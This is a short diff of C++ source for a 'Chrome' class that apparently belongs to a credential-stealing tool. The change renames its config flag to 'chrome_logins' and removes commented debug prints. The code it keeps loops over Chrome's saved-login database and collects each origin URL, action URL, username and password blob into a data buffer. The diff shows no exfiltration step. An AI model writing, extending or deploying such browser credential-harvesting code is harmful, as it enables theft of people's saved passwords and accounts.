@@ -13,7 +13,7 @@ using json = nlohmann::json;
 
 Chrome::Chrome(std::string path) noexcept
 {
-	if (!config::chrome)
+	if (!config::chrome_logins)
 		return;
 
 	if (!utils::isFolder(path))
@@ -47,10 +47,6 @@ Chrome::Chrome(std::string path) noexcept
 	while (rc == SQLITE_ROW)
 	{
 		auto pwData = (char*)sqlite3_column_blob(stmt, 3);
-
-		//std::cout << "ORIGIN URL: " << sqlite3_column_text(stmt, 0) << std::endl;
-		//std::cout << "ACTION URL: " << sqlite3_column_text(stmt, 1) << std::endl;
-		//std::cout << "USERNAME: " << sqlite3_column_text(stmt, 2) << std::endl;
 
 		this->data.append("ORIGIN URL: " + utils::uCharToString(sqlite3_column_text(stmt, 0)) + " \n");
 		this->data.append("ACTION URL: " + utils::uCharToString(sqlite3_column_text(stmt, 1)) + " \n");
